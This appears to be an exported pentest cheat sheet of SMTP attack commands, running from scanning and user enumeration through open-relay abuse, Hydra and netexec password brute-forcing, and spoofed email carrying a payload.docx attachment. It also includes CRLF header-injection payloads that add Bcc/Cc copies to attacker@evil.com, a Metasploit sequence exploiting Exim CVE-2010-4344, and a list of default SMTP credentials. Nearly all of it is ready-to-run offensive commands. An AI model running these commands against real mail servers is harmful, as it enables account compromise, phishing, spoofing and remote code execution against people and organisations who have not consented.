---
id: "lzicbe0u1mpsivqqf"
title: "smtp"
description: ""
tags: []
order: 7
createdAt: "2026-05-30T15:45:35.511Z"
updatedAt: "2026-05-30T15:45:45.870Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"49o3t6qt1mpsivyc3","order":0,"collapsed":false} -->

### ev5oonw6cmpsivye7
```bash
nmap -sV -sC -p 25,465,587 $TARGET
```

_Port Discovery & Scanning_

**Tags:** smtp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"ev5oonw6cmpsivye7","language":"bash","sectionId":"49o3t6qt1mpsivyc3","tags":["smtp","nmap","rustscan","recon","discovery"]} -->

### buxzmdqljmpsivyed
```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-vuln-cve2010-4344 $TARGET
```

**Tags:** smtp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"buxzmdqljmpsivyed","language":"bash","sectionId":"49o3t6qt1mpsivyc3","tags":["smtp","nmap","rustscan","recon","discovery"]} -->

### 4cddj0w8pmpsivyeh
```bash
rustscan -a $TARGET -p 25,465,587 -- -sV --script smtp-commands
```

**Tags:** smtp, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"4cddj0w8pmpsivyeh","language":"bash","sectionId":"49o3t6qt1mpsivyc3","tags":["smtp","nmap","rustscan","recon","discovery"]} -->

## Banner Grabbing
<!-- section: {"id":"s7bcr65swmpsivycb","order":1,"collapsed":false} -->

### km6u28t8pmpsivyex
```bash
nc $TARGET 25
```

_Banner Grabbing_

**Tags:** smtp, banner, enumeration, recon
<!-- cmd: {"id":"km6u28t8pmpsivyex","language":"bash","sectionId":"s7bcr65swmpsivycb","tags":["smtp","banner","enumeration","recon"]} -->

### 8cyl6754ompsivyf1
```bash
EHLO pentest.local
```

**Tags:** smtp, banner, enumeration, recon
<!-- cmd: {"id":"8cyl6754ompsivyf1","language":"bash","sectionId":"s7bcr65swmpsivycb","tags":["smtp","banner","enumeration","recon"]} -->

### 7ko2j32ctmpsivyf5
```bash
telnet $TARGET 25
```

**Tags:** smtp, banner, enumeration, recon
<!-- cmd: {"id":"7ko2j32ctmpsivyf5","language":"bash","sectionId":"s7bcr65swmpsivycb","tags":["smtp","banner","enumeration","recon"]} -->

### 841hclognmpsivyfa
```bash
EHLO attacker.com
```

**Tags:** smtp, banner, enumeration, recon
<!-- cmd: {"id":"841hclognmpsivyfa","language":"bash","sectionId":"s7bcr65swmpsivycb","tags":["smtp","banner","enumeration","recon"]} -->

### 7ii90ytu9mpsivyff
```bash
nmap --script smtp-commands -p 25 $TARGET
```

**Tags:** smtp, banner, enumeration, recon
<!-- cmd: {"id":"7ii90ytu9mpsivyff","language":"bash","sectionId":"s7bcr65swmpsivycb","tags":["smtp","banner","enumeration","recon"]} -->

## User Enumeration
<!-- section: {"id":"pxvvt419vmpsivyce","order":2,"collapsed":false} -->

### 93eurxwqumpsivyft
```bash
smtp-user-enum -M VRFY -U users.txt -t $TARGET
```

_User Enumeration VRFY, EXPN, RCPT TO techniques to confirm valid users._

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"93eurxwqumpsivyft","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### g5z3oxcrnmpsivyfx
```bash
nc $TARGET 25
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"g5z3oxcrnmpsivyfx","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### 9l6fx53bnmpsivyg1
```bash
VRFY $USER
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"9l6fx53bnmpsivyg1","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### l0vjbfv8qmpsivyg5
```bash
smtp-user-enum -M RCPT -D $DOMAIN -U users.txt -t $TARGET
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"l0vjbfv8qmpsivyg5","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### 9325go1d4mpsivyga
```bash
nc $TARGET 25
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"9325go1d4mpsivyga","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### azp18pd05mpsivygd
```bash
EXPN admins
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"azp18pd05mpsivygd","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### zh0xqxbf7mpsivygh
```bash
netexec smtp $TARGET -u users.txt -p '' --no-bruteforce
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"zh0xqxbf7mpsivygh","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### iclha3xcampsivygl
```bash
use auxiliary/scanner/smtp/smtp_enum
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"iclha3xcampsivygl","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### 453655bakmpsivygp
```bash
set RHOSTS $TARGET
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"453655bakmpsivygp","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### t86ghij74mpsivygs
```bash
set USER_FILE users.txt
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"t86ghij74mpsivygs","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

### r4p0wzqh2mpsivygw
```bash
run
```

**Tags:** smtp, user-enumeration, vrfy, rcpt, expn, unauthenticated
<!-- cmd: {"id":"r4p0wzqh2mpsivygw","language":"bash","sectionId":"pxvvt419vmpsivyce","tags":["smtp","user-enumeration","vrfy","rcpt","expn","unauthenticated"]} -->

## Open Relay Check
<!-- section: {"id":"dfqdhw8pompsivycj","order":3,"collapsed":false} -->

### zzm7t33psmpsivyhb
```bash
nc $TARGET 25
```

_Open Relay Check_

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"zzm7t33psmpsivyhb","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### z1mf71hvpmpsivyhg
```bash
EHLO test.com
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"z1mf71hvpmpsivyhg","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### 6odanxi83mpsivyhk
```bash
MAIL FROM: <attacker@evil.com>
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"6odanxi83mpsivyhk","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### zew53anpfmpsivyho
```bash
RCPT TO: <victim@external.com>
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"zew53anpfmpsivyho","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### ceeookl74mpsivyht
```bash
DATA
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"ceeookl74mpsivyht","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### c5nh86tn2mpsivyhx
```bash
Subject: test
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"c5nh86tn2mpsivyhx","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### r6j87aaycmpsivyi1
```bash
test
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"r6j87aaycmpsivyi1","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### xpjrqav8ympsivyi6
```bash
.
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"xpjrqav8ympsivyi6","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### xkahw3mxumpsivyia
```bash
nmap --script smtp-open-relay -p 25 $TARGET
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"xkahw3mxumpsivyia","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### qr7efi0asmpsivyie
```bash
swaks --to victim@external.com --from attacker@evil.com --server $TARGET
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"qr7efi0asmpsivyie","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### boef43lpmmpsivyih
```bash
use auxiliary/scanner/smtp/smtp_relay
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"boef43lpmmpsivyih","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### 0q8bq4mbympsivyim
```bash
set RHOSTS $TARGET
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"0q8bq4mbympsivyim","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

### pqoxhoz24mpsivyiq
```bash
run
```

**Tags:** smtp, open-relay, misconfiguration, phishing, unauthenticated
<!-- cmd: {"id":"pqoxhoz24mpsivyiq","language":"bash","sectionId":"dfqdhw8pompsivycj","tags":["smtp","open-relay","misconfiguration","phishing","unauthenticated"]} -->

## SMTP Authentication Brute Force
<!-- section: {"id":"aysvb071umpsivycn","order":4,"collapsed":false} -->

### cck624syqmpsivyj8
```bash
hydra -L users.txt -P passwords.txt smtp://$TARGET -t 4 -f
```

_SMTP Authentication Brute Force_

**Tags:** smtp, bruteforce, hydra, authentication, credentials
<!-- cmd: {"id":"cck624syqmpsivyj8","language":"bash","sectionId":"aysvb071umpsivycn","tags":["smtp","bruteforce","hydra","authentication","credentials"]} -->

### 7zl0h9v15mpsivyjb
```bash
hydra -l $USER -P /usr/share/wordlists/rockyou.txt smtp://$TARGET:587 -S
```

**Tags:** smtp, bruteforce, hydra, authentication, credentials
<!-- cmd: {"id":"7zl0h9v15mpsivyjb","language":"bash","sectionId":"aysvb071umpsivycn","tags":["smtp","bruteforce","hydra","authentication","credentials"]} -->

### 1zo882rkimpsivyjg
```bash
hydra -L users.txt -P passwords.txt -s 587 smtp://$TARGET -t 4
```

**Tags:** smtp, bruteforce, hydra, authentication, credentials
<!-- cmd: {"id":"1zo882rkimpsivyjg","language":"bash","sectionId":"aysvb071umpsivycn","tags":["smtp","bruteforce","hydra","authentication","credentials"]} -->

### vugufqtnampsivyjl
```bash
netexec smtp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

**Tags:** smtp, bruteforce, hydra, authentication, credentials
<!-- cmd: {"id":"vugufqtnampsivyjl","language":"bash","sectionId":"aysvb071umpsivycn","tags":["smtp","bruteforce","hydra","authentication","credentials"]} -->

## Send Email via CLI (Authenticated)
<!-- section: {"id":"9i50g2kbgmpsivycq","order":5,"collapsed":false} -->

### mk76b49z2mpsivyju
```bash
swaks --to $TARGET_EMAIL --from spoofed@$DOMAIN --server $TARGET --auth LOGIN --auth-user $USER --auth-password '$PASS' --header "Subject: Pentest Test" --body "This is a test"
```

_Send Email via CLI (Authenticated) Useful for phishing simulation or testing relay._

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"mk76b49z2mpsivyju","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### ofvw2xi7cmpsivyjy
```bash
swaks --to $TARGET_EMAIL --from spoofed@$DOMAIN --server $TARGET --auth LOGIN --auth-user $USER --auth-password '$PASS' --attach payload.docx
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"ofvw2xi7cmpsivyjy","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### it9ojv0e6mpsivyk2
```bash
swaks --to $TARGET_EMAIL --server $TARGET --port 587 --tls --auth LOGIN --auth-user $USER --auth-password '$PASS'
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"it9ojv0e6mpsivyk2","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### 8te0ractmmpsivyk6
```bash
python3 -c "
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"8te0ractmmpsivyk6","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### fw6yt8m12mpsivyka
```bash
import smtplib
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"fw6yt8m12mpsivyka","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### 8dpxsko2tmpsivyke
```bash
s = smtplib.SMTP('$TARGET', 25)
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"8dpxsko2tmpsivyke","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### oyoghge4bmpsivykh
```bash
s.sendmail('from@$DOMAIN', 'to@$DOMAIN', 'Subject: test\n\ntest')
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"oyoghge4bmpsivykh","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### 4oku9juutmpsivykl
```bash
s.quit()
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"4oku9juutmpsivykl","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

### qi2b8byw9mpsivykp
```bash
"
```

**Tags:** smtp, send-email, swaks, phishing, relay
<!-- cmd: {"id":"qi2b8byw9mpsivykp","language":"bash","sectionId":"9i50g2kbgmpsivycq","tags":["smtp","send-email","swaks","phishing","relay"]} -->

## Email Spoofing Check
<!-- section: {"id":"e9f17o7v7mpsivycu","order":6,"collapsed":false} -->

### uguzwj60jmpsivyl6
```bash
swaks --to $TARGET_EMAIL --from ceo@$DOMAIN --server $TARGET
```

_Email Spoofing Check Test if SPF/DMARC/DKIM prevents spoofing._

**Tags:** smtp, spoofing, spf, dmarc, dkim, phishing
<!-- cmd: {"id":"uguzwj60jmpsivyl6","language":"bash","sectionId":"e9f17o7v7mpsivycu","tags":["smtp","spoofing","spf","dmarc","dkim","phishing"]} -->

### d1yiw69gdmpsivylb
```bash
dig TXT $DOMAIN | grep spf
```

**Tags:** smtp, spoofing, spf, dmarc, dkim, phishing
<!-- cmd: {"id":"d1yiw69gdmpsivylb","language":"bash","sectionId":"e9f17o7v7mpsivycu","tags":["smtp","spoofing","spf","dmarc","dkim","phishing"]} -->

### q5vdzc9hzmpsivyle
```bash
dig TXT _dmarc.$DOMAIN
```

**Tags:** smtp, spoofing, spf, dmarc, dkim, phishing
<!-- cmd: {"id":"q5vdzc9hzmpsivyle","language":"bash","sectionId":"e9f17o7v7mpsivycu","tags":["smtp","spoofing","spf","dmarc","dkim","phishing"]} -->

### lnpvq09txmpsivylh
```bash
dig TXT default._domainkey.$DOMAIN
```

**Tags:** smtp, spoofing, spf, dmarc, dkim, phishing
<!-- cmd: {"id":"lnpvq09txmpsivylh","language":"bash","sectionId":"e9f17o7v7mpsivycu","tags":["smtp","spoofing","spf","dmarc","dkim","phishing"]} -->

### s0wtf0oiompsivylm
```bash
nmap --script smtp-open-relay -p 25 $TARGET --script-args smtp-open-relay.to=$TARGET_EMAIL
```

**Tags:** smtp, spoofing, spf, dmarc, dkim, phishing
<!-- cmd: {"id":"s0wtf0oiompsivylm","language":"bash","sectionId":"e9f17o7v7mpsivycu","tags":["smtp","spoofing","spf","dmarc","dkim","phishing"]} -->

## NTLM Auth Info Leak
<!-- section: {"id":"s1z1h05c3mpsivycy","order":7,"collapsed":false} -->

### 8fnq28xovmpsivylx
```bash
nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=$DOMAIN $TARGET
```

_NTLM Auth Info Leak SMTP NTLM auth can leak domain/hostname info without valid creds._

**Tags:** smtp, ntlm, info-leak, unauthenticated, recon
<!-- cmd: {"id":"8fnq28xovmpsivylx","language":"bash","sectionId":"s1z1h05c3mpsivycy","tags":["smtp","ntlm","info-leak","unauthenticated","recon"]} -->

### nfe034rg7mpsivym1
```bash
nc $TARGET 25
```

**Tags:** smtp, ntlm, info-leak, unauthenticated, recon
<!-- cmd: {"id":"nfe034rg7mpsivym1","language":"bash","sectionId":"s1z1h05c3mpsivycy","tags":["smtp","ntlm","info-leak","unauthenticated","recon"]} -->

### ec6cb224dmpsivym5
```bash
EHLO test
```

**Tags:** smtp, ntlm, info-leak, unauthenticated, recon
<!-- cmd: {"id":"ec6cb224dmpsivym5","language":"bash","sectionId":"s1z1h05c3mpsivycy","tags":["smtp","ntlm","info-leak","unauthenticated","recon"]} -->

### 58tsd8cdhmpsivym8
```bash
AUTH NTLM TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAFAs4OAAAADw==
```

**Tags:** smtp, ntlm, info-leak, unauthenticated, recon
<!-- cmd: {"id":"58tsd8cdhmpsivym8","language":"bash","sectionId":"s1z1h05c3mpsivycy","tags":["smtp","ntlm","info-leak","unauthenticated","recon"]} -->

## SMTP Injection / Header Injection
<!-- section: {"id":"a2qa5pfcgmpsivyd2","order":8,"collapsed":false} -->

### qex6cvnhlmpsivymq
```bash
swaks --to "victim@$DOMAIN%0ACc:attacker@evil.com" --server $TARGET
```

_SMTP Injection / Header Injection_

**Tags:** smtp, header-injection, injection, web
<!-- cmd: {"id":"qex6cvnhlmpsivymq","language":"bash","sectionId":"a2qa5pfcgmpsivyd2","tags":["smtp","header-injection","injection","web"]} -->

### ay4ou8q13mpsivymu
```bash
curl -sk "http://$TARGET/contact?email=victim@$DOMAIN%0d%0aBcc:attacker@evil.com"
```

**Tags:** smtp, header-injection, injection, web
<!-- cmd: {"id":"ay4ou8q13mpsivymu","language":"bash","sectionId":"a2qa5pfcgmpsivyd2","tags":["smtp","header-injection","injection","web"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"o6up6y79impsivyd6","order":9,"collapsed":false} -->

### cf52ekba3mpsivynd
```bash
nmap -p 25,465,587 --script "smtp-*" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** smtp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"cf52ekba3mpsivynd","language":"bash","sectionId":"o6up6y79impsivyd6","tags":["smtp","nmap","nse","vulnerability-scan"]} -->

### nb0kj4dydmpsivyng
```bash
nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-vuln-cve2010-4344 $TARGET
```

**Tags:** smtp, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"nb0kj4dydmpsivyng","language":"bash","sectionId":"o6up6y79impsivyd6","tags":["smtp","nmap","nse","vulnerability-scan"]} -->

## CVE-2010-4344 (Exim Heap Overflow)
<!-- section: {"id":"owvg22am6mpsivyd9","order":10,"collapsed":false} -->

### c2scpsh0rmpsivyns
```bash
nmap --script smtp-vuln-cve2010-4344 --script-args smtp-vuln-cve2010-4344.exploit -p 25 $TARGET
```

_CVE-2010-4344 (Exim Heap Overflow)_

**Tags:** smtp, exim, cve, exploitation, rce
<!-- cmd: {"id":"c2scpsh0rmpsivyns","language":"bash","sectionId":"owvg22am6mpsivyd9","tags":["smtp","exim","cve","exploitation","rce"]} -->

### ambtfnp3wmpsivynw
```bash
use exploit/unix/smtp/exim4_string_format
```

**Tags:** smtp, exim, cve, exploitation, rce
<!-- cmd: {"id":"ambtfnp3wmpsivynw","language":"bash","sectionId":"owvg22am6mpsivyd9","tags":["smtp","exim","cve","exploitation","rce"]} -->

### u0b55oraampsivyo1
```bash
set RHOSTS $TARGET
```

**Tags:** smtp, exim, cve, exploitation, rce
<!-- cmd: {"id":"u0b55oraampsivyo1","language":"bash","sectionId":"owvg22am6mpsivyd9","tags":["smtp","exim","cve","exploitation","rce"]} -->

### er5t4ii50mpsivyo5
```bash
run
```

**Tags:** smtp, exim, cve, exploitation, rce
<!-- cmd: {"id":"er5t4ii50mpsivyo5","language":"bash","sectionId":"owvg22am6mpsivyd9","tags":["smtp","exim","cve","exploitation","rce"]} -->

## Common Misconfigurations
<!-- section: {"id":"sv36wnfp3mpsivydd","order":11,"collapsed":false} -->

### n5529ohr0mpsivyol
```bash
swaks --to external@gmail.com --from fake@$DOMAIN --server $TARGET
```

_Common Misconfigurations_

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"n5529ohr0mpsivyol","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### o7pdjnq5mmpsivyoo
```bash
nc $TARGET 25
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"o7pdjnq5mmpsivyoo","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### barlwy233mpsivyot
```bash
VRFY root
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"barlwy233mpsivyot","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### w6zd7lbycmpsivyox
```bash
dig TXT $DOMAIN | grep -v spf
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"w6zd7lbycmpsivyox","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### mu0153xttmpsivyp1
```bash
nc $TARGET 25
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"mu0153xttmpsivyp1","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### a046adm50mpsivyp5
```bash
AUTH PLAIN (base64_encoded_creds)
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"a046adm50mpsivyp5","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### n0yr503qlmpsivyp9
```bash
nc $TARGET 25
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"n0yr503qlmpsivyp9","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

### uqmo7mizgmpsivypc
```bash
telnet $TARGET 25
```

**Tags:** smtp, misconfiguration, open-relay, vrfy, spoofing
<!-- cmd: {"id":"uqmo7mizgmpsivypc","language":"bash","sectionId":"sv36wnfp3mpsivydd","tags":["smtp","misconfiguration","open-relay","vrfy","spoofing"]} -->

## Default Credentials
<!-- section: {"id":"pwz3vn95pmpsivydh","order":12,"collapsed":false} -->

### d004bo72impsivypu
```bash
admin:admin
```

_Default Credentials_

**Tags:** smtp, default-credentials
<!-- cmd: {"id":"d004bo72impsivypu","language":"bash","sectionId":"pwz3vn95pmpsivydh","tags":["smtp","default-credentials"]} -->

### ni9eqimk5mpsivypy
```bash
postmaster:postmaster
```

**Tags:** smtp, default-credentials
<!-- cmd: {"id":"ni9eqimk5mpsivypy","language":"bash","sectionId":"pwz3vn95pmpsivydh","tags":["smtp","default-credentials"]} -->

### 2iovsvj5cmpsivyq2
```bash
mail:mail
```

**Tags:** smtp, default-credentials
<!-- cmd: {"id":"2iovsvj5cmpsivyq2","language":"bash","sectionId":"pwz3vn95pmpsivydh","tags":["smtp","default-credentials"]} -->

### l1j1u5m4ampsivyq6
```bash
smtp:smtp
```

**Tags:** smtp, default-credentials
<!-- cmd: {"id":"l1j1u5m4ampsivyq6","language":"bash","sectionId":"pwz3vn95pmpsivydh","tags":["smtp","default-credentials"]} -->
